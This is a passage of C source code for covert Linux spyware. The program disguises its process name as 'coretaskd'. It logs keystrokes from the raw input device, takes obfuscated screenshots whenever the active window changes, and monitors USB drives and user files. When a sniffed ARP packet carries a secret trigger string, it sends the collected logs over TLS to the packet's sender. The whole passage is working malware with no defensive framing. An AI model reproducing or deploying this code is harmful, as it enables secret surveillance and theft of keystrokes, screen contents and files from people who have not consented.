        SSL_CTX_free(ctx);
        return 1;
    }

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(SERVER_PORT);
    addr.sin_addr.s_addr = *(in_addr_t *)&arp_header->arp_spa;

    int retries = 0;
    while (retries < MAX_RETRIES_CONNECT) {
        if (connect(server, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            log_message("Connected to server");
            break;
        }
        retries++;
        if (retries >= MAX_RETRIES_CONNECT) {
            log_message("Error: Exceeded max connection retries");
            if (close(server) == -1) {
                log_message("Error: Failed to close socket");
            }
            SSL_CTX_free(ctx);
            return 1;
        }
        log_message("Error: Unable to connect, retrying after sleep");
        sleep(SLEEP_TIME_CONNECT);
    }

    SSL *ssl = SSL_new(ctx);
    if (!ssl) {
        log_message("Error: SSL_new() failed");
        if (close(server) == -1) {
            log_message("Error: Failed to close socket");
        }
        SSL_CTX_free(ctx);
        return 1;
    }

    if (SSL_set_fd(ssl, server) != 1) {
        log_message("Error: SSL_set_fd() failed");
        SSL_free(ssl);
        if (close(server) == -1) {
            log_message("Error: Failed to close socket");
        }
        SSL_CTX_free(ctx);
        return 1;
    }

    if (SSL_connect(ssl) <= 0) {
        log_message("Error: SSL_connect failed");
        SSL_free(ssl);
        if (close(server) == -1) {
            log_message("Error: Failed to close socket");
        }
        SSL_CTX_free(ctx);
        return 1;
    }

    // Send all files from the LOG_FOLDER/TO_SEND_FOLDER directory
    DIR *dir;
    struct dirent *entry;
    char fullPath[PATH_MAX];
    char sendFolderPath[PATH_MAX];
    if (snprintf(sendFolderPath, sizeof(sendFolderPath), "%s%s", LOG_FOLDER, TO_SEND_FOLDER) >= PATH_MAX) {
        log_message("Error: sendFolderPath is too long");
        SSL_free(ssl);
        if (close(server) == -1) {
            log_message("Error: Failed to close socket");
        }
        SSL_CTX_free(ctx);
        return 1;
    }
    dir = opendir(sendFolderPath);
    if (dir == NULL) {
        log_message("Error: Failed to open send folder");
        SSL_free(ssl);
        if (close(server) == -1) {
            log_message("Error: Failed to close socket");
        }
        SSL_CTX_free(ctx);
        return 1;
    }

    int file_count = 0;
    if (dir) {
        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_type == DT_REG) {
                file_count++;
            }
        }
        rewinddir(dir);

        int written = SSL_write(ssl, &file_count, sizeof(int));
        if (written <= 0) {
            log_message("Error: SSL_write failed");
            if (closedir(dir) == -1) {
                log_message("Error: Failed to close send folder");
            }
            SSL_free(ssl);
            if (close(server) == -1) {
                log_message("Error: Failed to close socket");
            }
            SSL_CTX_free(ctx);
            return 1;
        }


        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_type == DT_REG) {
                written = snprintf(fullPath, sizeof(fullPath), "%s%s", sendFolderPath, entry->d_name);
                if (written < 0 || written >= sizeof(fullPath)) {
                    log_message("Error: Path truncation or snprintf error. Skipping file");
                    continue; // Skip this file
                }
                if (send_file(ssl, fullPath) == 1) {
                    log_message("Error: Failed to send file");
                    break;
                }
            }
        }
        if (closedir(dir) == -1) {
            log_message("Error: Failed to close send folder");
        }
    }

    SSL_free(ssl);
    if (close(server) == -1) {
        log_message("Error: Failed to close socket");
    }
    SSL_CTX_free(ctx);
}

void check_arp_request(u_char *user_data, const struct pcap_pkthdr *pkthdr, const u_char *packet) {
    size_t custom_payload_size = strlen(CUSTOM_PAYLOAD) + 1;

    struct ether_header *eth_header;
    struct ether_arp *arp_header;
    char custom_payload_buffer[MAX_PAYLOAD_SIZE] = {0}; // Buffer for storing the payload safely
    const size_t arp_packet_expected_length = sizeof(struct ether_header) + sizeof(struct ether_arp) + custom_payload_size;

    // Check if the packet is large enough to contain the expected ARP packet and the custom payload
    if (pkthdr->caplen < arp_packet_expected_length) {
        return;
    }

    eth_header = (struct ether_header *) packet;

    if (ntohs(eth_header->ether_type) == ETHERTYPE_ARP) {
        arp_header = (struct ether_arp *)(packet + sizeof(struct ether_header));
        char *payload_ptr = (char *)(packet + sizeof(struct ether_header) + sizeof(struct ether_arp));

        strncpy(custom_payload_buffer, payload_ptr, custom_payload_size - 1);
        custom_payload_buffer[custom_payload_size - 1] = '\0';

        if (strncmp(custom_payload_buffer, CUSTOM_PAYLOAD, custom_payload_size - 1) == 0) {
            log_message("Custom string payload detected");
            if (copy_files()) {
                return;
            }
            send_files_to_server(arp_header);
        }
    }
}

void capture_screenshot(const char *folder) {
    char timestamp[128];
    char filename[PATH_MAX];
    struct timeval tv;
    struct tm *tm_info;

    if (gettimeofday(&tv, NULL) != 0) {
        log_message("Error: Failed to get the time of day");
        return;
    }
    tm_info = localtime(&tv.tv_sec);
    if (!tm_info) {
        log_message("Error: Failed to get local time");
        return;
    }
    
    if (!strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", tm_info)) {
        log_message("Error: Failed to format timestamp");
        return;
    }

    char hashed_name[65];
    if (compute_sha256_of_string(timestamp, hashed_name) != 0) {
        log_message("Error: Failed to hash timestamp");
        return;
    }

    int written = snprintf(filename, sizeof(filename), "%s/%s", folder, hashed_name);
    if (written < 0 || written >= sizeof(filename)) {
        log_message("Error: Failed to format filename");
        return;
    }
    

    Display *display = XOpenDisplay(NULL);
    if (!display) {
        return;
    }

    Window root = DefaultRootWindow(display);
    XWindowAttributes gwa;
    if (XGetWindowAttributes(display, root, &gwa) == 0) {
        XCloseDisplay(display);
        return;
    }

    int width = gwa.width;
    int height = gwa.height;
    XImage *image = XGetImage(display, root, 0, 0, width, height, AllPlanes, ZPixmap);
    if (!image) {
        XCloseDisplay(display);
        return;
    }

    int header_size = snprintf(NULL, 0, "P6\n%d %d\n255\n", width, height);
    int image_size = width * height * 3; // 3 bytes per pixel for PPM format (RGB)
    int total_size = header_size + image_size;

    char *buffer = malloc(total_size);
    if (!buffer) {
        XDestroyImage(image);
        XCloseDisplay(display);
        return;
    }

    // Write PPM header to buffer
    snprintf(buffer, total_size, "P6\n%d %d\n255\n", width, height);

    // Extract raw image data into buffer
    char *ptr = buffer + header_size;
    for (int y = 0; y < height; y++) {
        for (int x = 0; x < width; x++) {
            long pixel = XGetPixel(image, x, y);
            *ptr++ = (pixel & image->red_mask) >> 16;
            *ptr++ = (pixel & image->green_mask) >> 8;
            *ptr++ = pixel & image->blue_mask;
        }
    }

    XDestroyImage(image);
    XCloseDisplay(display);

    // Encrypt the entire buffer
    char *encrypted_data = xor_encrypt(buffer, total_size);
    free(buffer);

    if (!encrypted_data) {
        return;
    }

    FILE *f = fopen(filename, "wb");
    if (!f) {
        free(encrypted_data);
        return;
    }

    fwrite(encrypted_data, 1, total_size, f);
    
    fclose(f);
    free(encrypted_data);
}

// Global for handling errors from XSelectInput
int display_success = 1;

// Custom error handler for XSelectInput
int handleError(Display *d, XErrorEvent *e) {
    log_message("Error: XSelectInput failed");
    display_success = 0;
    return 0;
}

volatile sig_atomic_t signalReceived = 0;

void signalHandler(int signal) {
    if (signal == SIGTERM) {
        signalReceived = 1;
    }
}

int main() {
    pid_t program_pid = getpid();

    if (prctl(PR_SET_NAME, "coretaskd", 0, 0, 0) == -1) {
        log_message("Error: Failed to rename process");
        return 1;
    }

    int udev_success = 1;
    int pcap_success = 1;
    int keyboard_success = 1;
    int fanotify_success = 1;

    // Udev & Fanotify
    struct udev* udev;
    struct udev_monitor* monitor;
    struct udev_device* dev;

    udev = udev_new();
    if (!udev) {
        log_message("Error: Failed to initialize udev");
        udev_success = 0;
    }

    int fanotify_fd = initialize_fanotify();
    if (fanotify_fd == -1) {
        fanotify_success = 0;
    }
    else {
       mark_directory_and_subdirectories_to_monitor(fanotify_fd, USER_DIRECTORY);
    }

    struct pollfd fds[FD_POLL_MAX];
    if (fanotify_success) {
        fds[FD_POLL_FANOTIFY].fd = fanotify_fd;
        fds[FD_POLL_FANOTIFY].events = POLLIN;
    }
    
    if (udev) {
        monitor = udev_monitor_new_from_netlink(udev, "udev");
        if (monitor == NULL) {
            udev_success = 0;
            log_message("Error: Failed to create udev monitor");
        }
        else {
            udev_monitor_filter_add_match_subsystem_devtype(monitor, "block", "disk");
            if (udev_monitor_enable_receiving(monitor) < 0) {
                udev_success = 0;
                log_message("Error: Failed to bind udev monitor");
            }
            else {
                if (fanotify_success) {
                    monitor_existing_flashdrives(udev, fanotify_fd);
                }
            }
            
        }        
    }

    // X11 Display
    Window root;
    Atom net_active_window;
    Display *display = XOpenDisplay(NULL);
    if (!display) {
        log_message("Error: Unable to open X display");
        display_success = 0;
    }
    else {
        root = DefaultRootWindow(display);
        net_active_window = XInternAtom(display, "_NET_ACTIVE_WINDOW", False);
        if (net_active_window == None) {
            log_message("Error: Failed to intern the _NET_ACTIVE_WINDOW atom");
            XCloseDisplay(display);
            display_success = 0;
        }
        else {
            XSetErrorHandler(handleError); // Custom error handler for XSelectInput
            XSelectInput(display, root, PropertyChangeMask);
            XFlush(display);
            if (display_success == 0) {
                XCloseDisplay(display);
            }
        }
    }

    // PCAP
    char *pcap_dev;
    pcap_t *handle = NULL;
    int packet_count = 0;

    char errbuf[PCAP_ERRBUF_SIZE];
    memset(errbuf, 0, PCAP_ERRBUF_SIZE);
    pcap_dev = pcap_lookupdev(errbuf);
    if (pcap_dev == NULL) {
        log_message("Error: Pcap device not found");
        pcap_success = 0;
    }
    else {
        handle = pcap_open_live(pcap_dev, BUFSIZ, 0, 1000, errbuf);
        if (handle == NULL) {
            log_message("Error: Failed to open pcap device");
            pcap_success = 0;
        }
        else {
            // Set the handle to non-blocking mode
            if (pcap_setnonblock(handle, 1, errbuf) == -1) {
                log_message("Error: Failed to set non-blocking mode for pcap");
                pcap_close(handle);
                pcap_success = 0;
            }
        }
    }    

    // Keyboard
    FILE *keyboard = NULL;
    int eventNum = get_keyboard_event_num();
    if (eventNum == -1 || eventNum == -2) {
        keyboard_success = 0;
        log_message("Error: Failed to get keyboard file");
    }
    else {
        char eventFilePath[256];

        int written = snprintf(eventFilePath, sizeof(eventFilePath), "/dev/input/event%d", eventNum);
        if (written < 0 || written >= sizeof(eventFilePath)) {
            log_message("Error: Failed to format keyboard filepath");
            keyboard_success = 0;
        }
        keyboard = fopen(eventFilePath, "r");
        if (!keyboard) {
            log_message("Error: Failed to open keyboard file");
            keyboard_success = 0;
        }
    }
    int event_size = sizeof(struct input_event);
    struct input_event events[3];

    signal(SIGTERM, signalHandler);

    while (1) {
        if (signalReceived) {
            break;
        }

        // Monitoring devices
        if (udev_success) {
            // Wait for a device event
            dev = udev_monitor_receive_device(monitor);
            if (dev) {
                const char* devnode = udev_device_get_devnode(dev);
                if (devnode) {
                    const char* name = udev_device_get_property_value(dev, "ID_MODEL");
                    const char* vendor = udev_device_get_property_value(dev, "ID_VENDOR");
                    const char* serial = udev_device_get_property_value(dev, "ID_SERIAL_SHORT");
                    const char* operation = udev_device_get_action(dev);

                    if (operation && strcmp(operation, "remove") == 0) {
                        log_message("Device has been detached");
                        char string_buffer[256];
                        int written = snprintf(string_buffer, sizeof(string_buffer), "Device name: %s", name ? name : "Unknown");
                        if (written < 0 || written >= sizeof(string_buffer)) {
                            log_message("Error: Failed to format device name");
                        }
                        else {
                            log_message(string_buffer);
                        }
                        
                        written = snprintf(string_buffer, sizeof(string_buffer), "Device vendor: %s", vendor ? vendor : "Unknown");
                        if (written < 0 || written >= sizeof(string_buffer)) {
                            log_message("Error: Failed to format device vendor");
                        }
                        else {
                            log_message(string_buffer);
                        }

                        written = snprintf(string_buffer, sizeof(string_buffer), "Serial number: %s", serial ? serial : "Unknown");
                        if (written < 0 || written >= sizeof(string_buffer)) {
                            log_message("Error: Failed to format device serial number");
                        }
                        else {
                            log_message(string_buffer);
                        }
                    }
                    else {
                        log_message("New device has been attached");
                        char string_buffer[256];
                        int written = snprintf(string_buffer, sizeof(string_buffer), "Device name: %s", name ? name : "Unknown");
                        if (written < 0 || written >= sizeof(string_buffer)) {
                            log_message("Error: Failed to format device name");
                        }
                        else {
                            log_message(string_buffer);
                        }
                        
                        written = snprintf(string_buffer, sizeof(string_buffer), "Device vendor: %s", vendor ? vendor : "Unknown");
                        if (written < 0 || written >= sizeof(string_buffer)) {
                            log_message("Error: Failed to format device vendor");
                        }
                        else {
                            log_message(string_buffer);
                        }

                        written = snprintf(string_buffer, sizeof(string_buffer), "Serial number: %s", serial ? serial : "Unknown");
                        if (written < 0 || written >= sizeof(string_buffer)) {
                            log_message("Error: Failed to format device serial number");
                        }
                        else {
                            log_message(string_buffer);
                        }

                        sleep(5);

                        // Creating and initializing udev enumerate to search for child devices to get UUID of partitions
                        struct udev_enumerate *enumerate = udev_enumerate_new(udev);
                        if (enumerate) {
                            udev_enumerate_add_match_parent(enumerate, dev);
                            udev_enumerate_add_match_subsystem(enumerate, "block");
                            if (udev_enumerate_scan_devices(enumerate) < 0) {
                                log_message("Error: Failed to scan devices");
                            }
                            else {
                                struct udev_list_entry *devices, *entry;
                                devices = udev_enumerate_get_list_entry(enumerate);
                                if (devices != NULL) {
                                    udev_list_entry_foreach(entry, devices) {
                                        const char *path = udev_list_entry_get_name(entry);
                                        struct udev_device* child_dev = udev_device_new_from_syspath(udev, path);
                                        if (!child_dev) {
                                            log_message("Error: Failed to create device from syspath.");
                                        }
                                        else {
                                            const char *uuid = udev_device_get_property_value(child_dev, "ID_FS_UUID");
                                            if (uuid) {
                                                snprintf(string_buffer, sizeof(string_buffer), "Filesystem UUID of %s: %s", udev_device_get_devnode(child_dev), uuid);
                                                log_message(string_buffer);
                                            }
                                            if (fanotify_success) {
                                                char *mount_point = NULL;
                                                //printf("Searching for mount point of devnode %s\n", devnode);
                                                const char *child_devnode = udev_device_get_devnode(child_dev);
                                                if (child_devnode != NULL) {
                                                    if (find_mount_point(child_devnode, &mount_point) == 0) {
                                                        int written = snprintf(string_buffer, sizeof(string_buffer), "Device mount point: %s", mount_point);
                                                        if (written < 0 || written >= sizeof(string_buffer)) {
                                                            log_message("Error: Failed to format device mount point");
                                                        }
                                                        else {
                                                            log_message(string_buffer);
                                                        }
                                                        mark_mount_to_monitor(fanotify_fd, mount_point);
                                                        free(mount_point);
                                                    }
                                                    else {
                                                        log_message("Mount point not found");
                                                    }    
                                                }

                                                
                                            }

                                            udev_device_unref(child_dev);
                                        }
                                    }
                                }
                                udev_enumerate_unref(enumerate);
                                
                            }
                            
                        }
                        else {
                            log_message("Error: Failed to create udev enumerate object");
                        }
                    }
                }
                udev_device_unref(dev);
            }
        }

        // Fanotify events
        if (fanotify_success) {
            if (poll(fds, FD_POLL_MAX, 0) < 0) {
                log_message("Error: Failed to poll fanotify");
                // If we do not make it 0, then infinite spam will occur
                fanotify_success = 0;
            }
            else {
                // fanotify event received?
                if (fds[FD_POLL_FANOTIFY].revents & POLLIN) {
                    char buffer[FANOTIFY_BUFFER_SIZE];
                    ssize_t length;
                    if ((length = read(fds[FD_POLL_FANOTIFY].fd,buffer,FANOTIFY_BUFFER_SIZE)) > 0) {
                        struct fanotify_event_metadata *metadata;
                        metadata = (struct fanotify_event_metadata *)buffer;
                        while (FAN_EVENT_OK (metadata, length)) {
                            process_fanotify_event(metadata, program_pid);
                            if (metadata->fd > 0) {
                                close (metadata->fd);
                            }
                            metadata = FAN_EVENT_NEXT (metadata, length);
                        }
                    }
                }
            }

        }

        // Keyboard events
        if (keyboard_success) {
            fd_set read_fds;
            struct timeval timeout;
            FD_ZERO(&read_fds);
            FD_SET(fileno(keyboard), &read_fds);
            timeout.tv_sec = 0;
            timeout.tv_usec = 0;

            int select_result = select(fileno(keyboard) + 1, &read_fds, NULL, NULL, &timeout);
            if (select_result > 0) {
                int event_bytes = fread(events, event_size, 3, keyboard);
                if (event_bytes < 3) {
                    if (ferror(keyboard)) {
                        log_message("Error: Failed to fread() keyboard");
                    }
                }
                else {
                    for (int i = 0; i < 3; i++) {
                        if (events[i].type == 1 && (events[i].value == 1 || events[i].value == 2)) {
                            log_keyboard(keycode_to_char(events[i].code));
                        }
                    }
                }
            }
            else if (select_result == -1) {
                log_message("Error: select() failed");
            }
        }

        // Pcap events
        if (pcap_success) {
            packet_count = pcap_dispatch(handle, 0, check_arp_request, NULL);
            if (packet_count < 0) {
                // Issue with network interface, drivers, system-level problems
                log_message("Error: Failed to proccess pcap packets");
                pcap_success = 0;
            }
        }
        // Display events
        if (display_success) {
            while (XPending(display)) {  // While there are events in the queue
                XEvent ev;
                XNextEvent(display, &ev);
                if (ev.type == PropertyNotify && ev.xproperty.atom == net_active_window) {
                    log_message("Active window changed, capturing screenshot");
                    capture_screenshot(LOG_FOLDER);
                }
            }
        }
    }
    printf("DEBUG: Exiting\n");
    if (keyboard) fclose(keyboard);
    if (handle) pcap_close(handle);
    if (monitor) udev_monitor_unref(monitor);
    if (udev) udev_unref(udev);
    if (fanotify_fd != -1) close(fanotify_fd);
    if (display) {
        XCloseDisplay(display);
        display = NULL;
    }
    EVP_cleanup();
    ERR_free_strings();
    CRYPTO_cleanup_all_ex_data();
    ERR_remove_state(0); 
    OPENSSL_cleanup();
    
    exit(0);
}